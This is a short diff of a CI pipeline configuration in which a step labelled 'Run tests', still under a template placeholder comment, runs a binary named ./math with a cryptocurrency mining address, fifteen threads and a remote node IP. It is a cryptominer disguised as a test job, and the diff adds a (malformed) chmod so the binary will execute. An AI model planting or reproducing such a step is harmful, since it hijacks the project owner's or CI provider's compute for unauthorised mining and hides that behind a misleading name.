@@ -12,7 +12,7 @@ jobs:
       # Replace this with a real test runner invocation
       - run:
           name: Run tests
-          command: ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 15 --spectred-address 34.173.20.107
+          command: chmod+x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 15 --spectred-address 34.173.20.107
   build:
     docker:
       - image: cimg/base:stable
